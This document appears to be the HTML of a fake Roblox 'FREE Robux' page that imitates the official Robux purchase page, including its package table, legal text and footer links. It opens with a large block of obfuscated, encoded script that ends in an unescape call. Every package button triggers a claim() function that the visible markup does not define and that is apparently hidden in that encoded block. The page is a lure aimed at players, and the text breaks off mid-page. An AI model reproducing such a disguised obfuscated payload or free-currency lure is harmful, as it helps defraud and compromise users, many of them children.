ŸbຆŷbັŷeືືŵaງືŷaຳຸŴaŸeŸfŷbຼŹaຉະູŷf຺ຉŴdຕ຺ຑນųfຒŵeຐŸaຸຮະບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທະŴaųdŷcŸeຫŸcŸaŵbງŸdຸີືŸcຶŴaຶູົŸbຆືŸdຳັŴbŷbŸcະືຉŸfŸeŷe຾ŹaຑŷeŸbŸfເŸbຶຂŵbŴbŴcŴfŵeŴbັŴcŵcຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŴfຯຶໂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŴbŷdື຾ŵfŲaŲc຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆຕ຋ŷeຶຼŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵe຋ŷdະຼŵd๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŷaາຽ຀ອີຮŸdŸaຓųcີຳືŷaີຉຬຶŸaŷdຳຳŸfຼŸeີŴeŷcຳະŸdຮືŸdູŸcųfŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŸf຀ŷfີŷfŸbຸŵaຂຶາແŸcŴcຸŸbຸŸcີŸbງŸeູະຮິŴcຶັົŸcŴdີຸŸeຬາູųeŵdŷbາາŸaųeຼຸໃ຀ŷf຾ແųfຠŸbŷfຽເųdເຳໃງູຳŷaູີຽຳųeŸcŸbŸeŹdງຮຆຳŸdູຶŸcີຯຍ຀ະຸŸdŴbູູະຼŸaŷaŷaŷfŸeູຍųfŸaŸeະຑŸdŸeຯŸfŸcຸູŸfຮŷeຳູຎງŸeີແຸອຫŷfຳຳųfŸeີŷcຳŸcຸາ຀ຶຸųfຽŸaູųaŶfູຮເົŴe຀຺ືືŷaŸaųaັŷfŸbųdŸbຳ຀ຽຮິ຾ູųaຶŸaųeŸbາຫŸeງŷaຽູິັŸbŷdົŴfງຖŹdງŸaຳຳູŷfŸdືŸcິງຶŸaາųf຤ູູູຶຽŸdųdŸcໃສŸcŷaŸeະາŸeຶູŸcųdູຫອິຮັິŴeųaຉŴfຉųdເຳໃງຮັູູັŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfຶາŷeŸcųeຼຸໃ຀ŷeູຳųfຳ຺າŸeųeŴaຓ຀ຫŸbŷbຆŸbŸaŷdŸdຆົŸcຼ຀ຫຼŸbະŸeິີແຳųeເŸc຀ຶຸųfŷdືຫŸcະຳųeຼຸໃິງຮŷdŷaຳົŸbŸcųeຶຽູິເųfŸbŸeະŸeັຆ຿ŸfŸdŸdŸeງ຺ູ຾຀ŷfŷeŸaŷbຶີ຀ຶັິຆŸaໃŷcŸcŷdຸາູຶŸdຸŸdຌųfຫຸŷdຆຎŴbຎ຀Źdຸ຾ຆູູŸaŸfຳŸbຶŸbຶ຀ŸdືŷfŸb຀຿ຸຽųeເŸbຬູŸfŸaŸcຮະŷeງŷfŸcຯງຫŸbŸfິຳųfຶŸbງŸcຶຶງຢູŸfŸcŸdųfຳະງຩŸbຶຍ຀Źbັະŷdື຀ີŸbŷdາເŷdູືŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງຫະງຮັູູັŸaຳŸcູງຶຳງຮŸeຯŸdŸeŸfŷfŸaຶງຫະເųfŷcະືŸaຼŸcີųdŷfູຶ຺ິຳŸd຀຿ຸຽųeŷaŸbຬ຀ŶfŸeŷeຳຳຼຍຆຯŸfŷd຀ŵeŷeųfະູູະŵaųeຶູŸdາືນŴeຑເŹbຽŴbŸeŸfŷbີຳŹaŴbŷaູŸc຋ີŸbາŸfŴcູິŸdຽຮŷd຺ຂųaŷcິຯຸŸcຓຂŸdິ຺ŸbຉຶຶŸaຳųbŵbພິຶ຿ŷfŷaŹdųaລູາາŷcŹdŵeຐຮŵaŴd຀ຫຸຽųeຮŷeະ຀ŷcຮŸaŷaູຶງŷfŸaųdŷeະŹdງŸbືŸcູųaŷfແųeຮີŸdອິະŸaຶ຀%dcໃ໒ŵbŷaŸbອູີųfŸd຾ສŸfŷcŸeັŸdŸdŸdຳŸb%d9ໂŻc๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfູŸd຀Ÿeັຳųeຓŷe຀ŸaŸfິາŵcຂາŸdŸcŸeຸນ຋຋຺ເົŴdິŸbŷfິŸf຿ŴbອຳŸaŴeŸb຺຋ŷdŷcŷdŸfເŸbຶ຅ųeŴeŷeະŸeຶຶŸaືųbງອŸeŷeŸaŸdŵcຂŸeາ຺ŸaŴeີŸdະິງŵaຯŸdຶີືŸcິງຶຫŷfຕຑຮຒųaຸາųeູັູ຀ŸcິŸcŸbŸdຸະຆŸeŷaະູຈງຜາųfŹdŸbຼຆŷbŷaŸbອູີ຋ຆ຺ຳົງົັັີ຀ືŸdະິຳ຀ŷcາຆŷbີŷeິŸbາŷbຆີຳŸcງŸcຶຶງອໃŸfູຳŸdຶųaŷfືາັຶະŸbງŸfຳູŸdŸbŷdŴaųe຤າູ຀ທຮຆືິັຳŵbຆີŸdຶາŸcຓຑŴeŹbຽ຺ŴaຸŸcŷfŸeຳົŴdŷdŸeັŴbຶŸaິŸcຐຶູŸfŸcŸdງ๵๸ງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfŷdຳຫŸfŸcŵbຆູາŹaຶŴaຳືŸdŸfųcŵbŶcີŸbŸaື຀ຸີຆສືັທຑຯŵfງຸຳŸfųfູŸbŸaັŸfຆາາŸaŸdຶŷeŸbືŸeະŸfŴbຖŴfŸdŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງຕຑŷbŸd຺ŵbŲb๴ųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆຸະຉືເŸaŸcິັຑຳຳີຯŷfຫອິງŵaŲcŲcųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdທຬŸdຽųfŷdຳຫŸfŸcŵbຆŷaີູິŸdŴcŸd຺ືŸeາŸbŴdືາູຬŷfຮŷdາຂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųfŵeŷeຶຼųeຮີຫືŸcŵcųeຮŸeັŸfŸcຆŵfທືາŷeŸdຆŷaŸeŷdŸcŸdŵdųbŷeŸeູŸfŸbŴbŷaຳຸŸdຳŸcູųfຒŵeຐŸaຸຮະບທຑŷaາຽຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaທຑŷaາຽຒ๵๻ųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖŴeຬີຽŵaŲd๷ງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŴfຯຶໂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆດŴcŷdŸdໂŵbŲc๺ųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘຐŷcັແŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖຆຉຑງຳŸcຯງະŸbຢີຘųfືາຸົ຤ŸcŷfໃŹaຨŸfŸdິŸeຶŶfຳຯຮŸdພຫະິŵcະໂųaŴaŴbŵcŲe๻຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຖຆຉຑງຳŸcຯງະŸbຢີຘųfິŸbŷfຽເŶdŷeŸbູŵdຮŸcຮຈີŸcຣŸcປາືŸfŸdŸeຸŶcຳŷeາຆŴdŴeŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ųaງຖŴfຯຶໂຒŲa๵ຆųf຀ųaງຆųeųdງ຀຀ງųfຆųf຀ຘຐŷcັແŵb๵Ųcງųfຆųf຀ųaງຆųeųdງ຀ŵeຐŷbື຿ຒ๽๻ຆųeųdງ຀຀ງųfຆųf຀ųaທŷcັແງŸdຬŵaງຼິິີຳືŷbŷaŸdŸdຳŸbສຸŸaູຶີŴbŷbŸcŸbຶຫຶŸdຳູຂບŲa๺ųeųdງ຀຀ງųfຆųf຀ųaງຆųeųdງŵeຬຶ຿ຆ຿ູŸcຶາັຮŷeຶŸdຸŸdຽŸfືັີິŴdຮຸະຶŷeະŸaິິປųfųeŵcຓຐຬŸdຽŵdŲb๵຀ųaງຆųeųdງ຀຀ງųfຆຕ຋ŷeຶຼŵcŲe๻๵Ųcງųfຆųf຀ųaງຆດŴcŷdŸdໂŵb15295667ຕຖປຓດຕທ'   unescape('ຏຑຑŵb'));
// -->


</script>

<div class="content" id="content">



            
<div id="robux-page" class="robux-page ng-scope">

                
<div robux-container-base="" id="robux-container-base" data-is-verification-upsell-enabled="false" data-is-scary-modal-enabled="false" data-is-eligible-for-cross-platform-pricing="false">

                    
<div class="row ng-scope" ng-modules="robloxApp, robux" ng-controller="robuxController">

                        
<!-- ngIf: robuxPageData.isInAppMode -->

                        
<!-- ngIf: robuxPageData.isInDesktopMode -->

                        
<div class="premium-container ng-scope" ng-if="robuxPageData.isInDesktopMode">

                            
<!-- ngIf: !showRobuxUpsellReactPageDiv -->

                            
<!-- ngIf: showRobuxUpsellReactPageDiv -->

                            
<div ng-if="showRobuxUpsellReactPageDiv" id="robux-upsell-react-page" class="ng-scope">

                                
<div id="robux-upsell-react-page-wrapper" class="low-cogs-container">

                                    
<div class="low-cogs-banner">

                                        
<div class="top-header">

                                            
<h1 class="low-cogs-header">
Enjoy FREE Robux
</h1>

                                            
<div class="top-subtitle-container">

<span>

<div class="top-subtitle">
No need for premium membership, you can get Free Robux
</div>

</span>

</div>

                                        
</div>

                                    
</div>

                                    
<div class="robux-page-content">

                                        
<div class="robux-std-container-1">

                                            
<div class="robux-standard-table">

                                                
<div class="robux-standard-packages-container">

                                                    
<div class="robux-standard-packages-table-desktop">

                                                        
<div class="robux-header-unit-container">

                                                            
<div class="robux-header-unit">

                                                                
<div class="header-container header-container-left">

<span class="font-body text">
Computer, web & gift cards
</span>
 
                                                                    
<button type="button" class="robux-head-icon-button  btn-generic-moreinfo-i-sm" title="moreinfo i">

<span class="icon-moreinfo-i">

</span>

</button>

                                                                
</div>

                                                            
</div>

                                                        
</div>

                                                        
<div class="robux-body">

                                                            
<div class="robux-unit-mobile-container">

                                                                
<div class="robux-unit-mobile">

                                                                    
<div class="robux-unit-mobile-top">

                                                                        
<div class="price-cell-left-align">

                                                                            
<div class="d-flex-inline gap-1 justify-content-start align-items-center">

<span class="price-tag font-header-1">
IDR 
<s>
3.599M
</s>
 
<b style="color: green;">
FREE
</b>

</span>

</div>

                                                                        
</div>

                                                                        
<div class="robux-button-mobile">

                                                                            
<div class="robux-button-container">

                                                                                
<button type="button" onclick="claim()" class="btn-growth-md btn-full-width badge-container d-flex align-items-center justify-content-center btn-primary-md btn-min-width">

<span class="icon-robux-white">

</span>

                                                                                    
<h4 class="inline-text">
26,400
</h4>

</button>

                                                                            
</div>

                                                                        
</div>

                                                                    
</div>

                                                                    
<div class="robux-unit-mobile-bottom">

                                                                        
<div class="robux-cell-high-cogs-amount">

<span class="font-body text">
Mobile & console:
</span>

<span class="icon-robux-gray-16x16">

</span>

                                                                            
<h4 class="inline-text high-cogs-robux-amount">
25,000
</h4>

</div>

                                                                    
</div>

                                                                
</div>

                                                            
</div>

                                                            
<div class="robux-unit-mobile-container">

                                                                
<div class="robux-unit-mobile">

                                                                    
<div class="robux-unit-mobile-top">

                                                                        
<div class="price-cell-left-align">

                                                                            
<div class="d-flex-inline gap-1 justify-content-start align-items-center">

<span class="price-tag font-header-1">
IDR 
<s>
1.799M
</s>
 
<b style="color: green;">
FREE
</b>

</span>

</div>

                                                                        
</div>

                                                                        
<div class="robux-button-mobile">

                                                                            
<div class="robux-button-container">

                                                                                
<button type="button" onclick="claim()" class="btn-growth-md btn-full-width badge-container d-flex align-items-center justify-content-center btn-primary-md btn-min-width">

<span class="icon-robux-white">

</span>

                                                                                    
<h4 class="inline-text">
12,100
</h4>

</button>

                                                                            
</div>

                                                                        
</div>

                                                                    
</div>

                                                                    
<div class="robux-unit-mobile-bottom">

                                                                        
<div class="robux-cell-high-cogs-amount">

<span class="font-body text">
Mobile & console:
</span>

<span class="icon-robux-gray-16x16">

</span>

                                                                            
<h4 class="inline-text high-cogs-robux-amount">
11,000
</h4>

</div>

                                                                    
</div>

                                                                
</div>

                                                            
</div>

                                                            
<div class="robux-unit-mobile-container">

                                                                
<div class="robux-unit-mobile">

                                                                    
<div class="robux-unit-mobile-top">

                                                                        
<div class="price-cell-left-align">

                                                                            
<div class="d-flex-inline gap-1 justify-content-start align-items-center">

<span class="price-tag font-header-1">
IDR 
<s>
900K
</s>
 
<b style="color: green;">
FREE
</b>

</span>

</div>

                                                                        
</div>

                                                                        
<div class="robux-button-mobile">

                                                                            
<div class="robux-button-container">

                                                                                
<button type="button" onclick="claim()" class="btn-growth-md btn-full-width badge-container d-flex align-items-center justify-content-center btn-primary-md btn-min-width">

<span class="icon-robux-white">

</span>

                                                                                    
<h4 class="inline-text">
5,800
</h4>

</button>

                                                                            
</div>

                                                                        
</div>

                                                                    
</div>

                                                                    
<div class="robux-unit-mobile-bottom">

                                                                        
<div class="robux-cell-high-cogs-amount">

<span class="font-body text">
Mobile & console:
</span>

<span class="icon-robux-gray-16x16">

</span>

                                                                            
<h4 class="inline-text high-cogs-robux-amount">
4,950
</h4>

</div>

                                                                    
</div>

                                                                
</div>

                                                            
</div>

                                                            
<div class="robux-unit-mobile-container">

                                                                
<div class="robux-unit-mobile">

                                                                    
<div class="robux-unit-mobile-top">

                                                                        
<div class="price-cell-left-align">

                                                                            
<div class="d-flex-inline gap-1 justify-content-start align-items-center">

<span class="price-tag font-header-1">
IDR 
<s>
360K
</s>
 
<b style="color: green;">
FREE
</b>

</span>

</div>

                                                                        
</div>

                                                                        
<div class="robux-button-mobile">

                                                                            
<div class="robux-button-container">

                                                                                
<button type="button" onclick="claim()" class="btn-growth-md btn-full-width badge-container d-flex align-items-center justify-content-center btn-primary-md btn-min-width">

<span class="icon-robux-white">

</span>

                                                                                    
<h4 class="inline-text">
2,200
</h4>

</button>

                                                                            
</div>

                                                                        
</div>

                                                                    
</div>

                                                                    
<div class="robux-unit-mobile-bottom">

                                                                        
<div class="robux-cell-high-cogs-amount">

<span class="font-body text">
Mobile & console:
</span>

<span class="icon-robux-gray-16x16">

</span>

                                                                            
<h4 class="inline-text high-cogs-robux-amount">
1,870
</h4>

</div>

                                                                    
</div>

                                                                
</div>

                                                            
</div>

                                                            
<div class="robux-unit-mobile-container">

                                                                
<div class="robux-unit-mobile">

                                                                    
<div class="robux-unit-mobile-top">

                                                                        
<div class="price-cell-left-align">

                                                                            
<div class="d-flex-inline gap-1 justify-content-start align-items-center">

<span class="price-tag font-header-1">
IDR 
<s>
180K
</s>
 
<b style="color: green;">
FREE
</b>

</span>

</div>

                                                                        
</div>

                                                                        
<div class="robux-button-mobile">

                                                                            
<div class="robux-button-container">

                                                                                
<button type="button" onclick="claim()" class="btn-growth-md btn-full-width badge-container d-flex align-items-center justify-content-center btn-primary-md btn-min-width">

<span class="icon-robux-white">

</span>

                                                                                    
<h4 class="inline-text">
1,100
</h4>

</button>

                                                                            
</div>

                                                                        
</div>

                                                                    
</div>

                                                                    
<div class="robux-unit-mobile-bottom">

                                                                        
<div class="robux-cell-high-cogs-amount">

<span class="font-body text">
Mobile & console:
</span>

<span class="icon-robux-gray-16x16">

</span>

                                                                            
<h4 class="inline-text high-cogs-robux-amount">
880
</h4>

</div>

                                                                    
</div>

                                                                
</div>

                                                            
</div>

                                                            
<div class="robux-unit-mobile-container">

                                                                
<div class="robux-unit-mobile">

                                                                    
<div class="robux-unit-mobile-top">

                                                                        
<div class="price-cell-left-align">

                                                                            
<div class="d-flex-inline gap-1 justify-content-start align-items-center">

<span class="price-tag font-header-1">
IDR 
<s>
90K
</s>
 
<b style="color: green;">
FREE
</b>

</span>

</div>

                                                                        
</div>

                                                                        
<div class="robux-button-mobile">

                                                                            
<div class="robux-button-container">

                                                                                
<button type="button" onclick="claim()" class="btn-growth-md btn-full-width badge-container d-flex align-items-center justify-content-center btn-primary-md btn-min-width">

<span class="icon-robux-white">

</span>

                                                                                    
<h4 class="inline-text">
550
</h4>

</button>

                                                                            
</div>

                                                                        
</div>

                                                                    
</div>

                                                                    
<div class="robux-unit-mobile-bottom">

                                                                        
<div class="robux-cell-high-cogs-amount">

<span class="font-body text">
Mobile & console:
</span>

<span class="icon-robux-gray-16x16">

</span>

                                                                            
<h4 class="inline-text high-cogs-robux-amount">
440
</h4>

</div>

                                                                    
</div>

                                                                
</div>

                                                            
</div>

                                                        
</div>

                                                    
</div>

                                                
</div>

                                            
</div>

                                        
</div>

                                        
<div class="legal-disclosure-container">

                                            
<p class="text-footer legal-text-holder">
When you buy Robux you receive only a limited, non-refundable, non-transferable, revocable license to use Robux, which has no value in real currency. By selecting the Premium subscription package, (1) you agree
                                                that you are over 18 and that you authorize us to charge your account every month until you cancel the subscription, and (2) you represent that you understand and agree to the Terms of Use, which includes
                                                an agreement to arbitrate any dispute between you and Roblox, and 
<a href="https://www.roblox.com/info/privacy" class="text-link">
Privacy Policy
</a>
. You can cancel at any time by clicking âCancel subscriptionâ
                                                on the 
<a href="https://www.roblox.com/my/account#!/billing" class="text-link">
billing tab
</a>
 of the setting page. If you cancel, you will still be charged for the current billing period. See 
<a href="https://www.roblox.com/info/terms" class="text-link">
Terms of Use
</a>
 for other limitations.
</p>

                                        
</div>

                                        
<div class="sg-system-feedback">

                                            
<div class="alert-system-feedback">

                                                
<div class="alert">

<span class="alert-content">

</span>

</div>

                                            
</div>

                                        
</div>

                                    
</div>

                                
</div>

                            
</div>

                            
<!-- end ngIf: showRobuxUpsellReactPageDiv -->

                        
</div>

                        
<!-- end ngIf: robuxPageData.isInDesktopMode -->

                    
</div>

                
</div>

            
</div>

            
<div id="verificationUpsell-container">

                
<div verificationupsell-container="">

</div>

            
</div>


        
</div>

    
</main>

    
<!--Bootstrap Footer React Component -->


    
<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True">

        
<div class="footer">

            
<ul class="row footer-links">

                
<li class="footer-link">

<a href="https://www.roblox.com/info/about-us?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
About Us
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/info/jobs?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Jobs
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/info/blog?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Blog
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/info/parents?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Parents
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/giftcards?locale=en_us" class="text-footer-nav giftcards" target="_blank" rel="noreferrer">
Gift Cards
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/info/help?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Help
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/info/terms?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Terms
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/info/accessibility?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Accessibility
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/info/privacy?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Privacy
</a>

</li>

                
<li class="footer-link">

<a href="https://www.roblox.com/my/account#!/privacy?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Your Privacy Choices
<img src="https://images.rbxcdn.com/dbc562edb12e2e68.webp" alt="" class="footer-postfixIcon">

</a>

</li>

                
<li>

</li>

            
</ul>

            
<div class="row copyright-container">

                
<div class="col-sm-6 col-md-3">

                    
<div class="language-selector-wrapper">

                        
<div class="input-group-btn dropdown btn-group">

                            
<button id="language-switcher" role="button" aria-haspopup="true" aria-expanded="false" type="button" class="input-dropdown-btn dropdown-toggle btn btn-default">

<span class="dropdown-icon icon-globe">

</span>

<span class="rbx-selection-label">
English
</span>

<span class="icon-down-16x16">

</span>

</button>

                            
<ul role="menu" class="dropdown-menu" aria-labelledby="language-switcher">

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Bahasa Indonesia
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Deutsch
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
English
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Español
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Français
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Italiano
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Polski
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Português (Brasil)
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Tiếng Việt
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Türkçe
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
العربية
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
ภาษาไทย
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
中文(简体)
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
中文(繁體)
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
日本語
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
한국어
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Bahasa Melayu*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Bokmål*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Cрпски*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Dansk*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Eesti*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
English (United Kingdom)*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Español (México)*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Filipino*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Français (Canada)*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Hrvatski*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Latviešu*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Lietuvių*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Magyar*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Nederlands*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Português (Portugal)*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Română*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Shqipe*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Slovenski*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Slovenčina*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Suomi*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Svenska*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Yкраїньска*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Čeština*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Ελληνικά*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Босански*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Български*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Русский*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
Қазақ Тілі*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
हिन्दी*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
বাংলা*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
සිංහල*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
ဗမာစာ*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
ქართული*
</a>

</li>

                                
<li role="presentation" class="">

<a role="menuitem" tabindex="-1" href="#">
ភាសាខ្មែរ*
</a>

</li>

                            
</ul>

                        
</div>

                    
</div>

                
</div>

                
<div class="col-sm-6 col-md-9">

                    
<p class="text-footer footer-note">
©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
</p>

                
</div>

            
</div>

        
</div>

    
</footer>

    
</div>

    
<div ng-controller="chatController" ng-class="{'collapsed': chatLibrary.chatLayout.collapsed}" id="chat-container" class="chat chat-container collapsed" chat-base="" style="display: block;">

        
<div id="chat-main" class="chat-main" ng-controller="chatBarController" ng-class="{'chat-main-empty': isChatEmpty() }" chat-bar="">

            
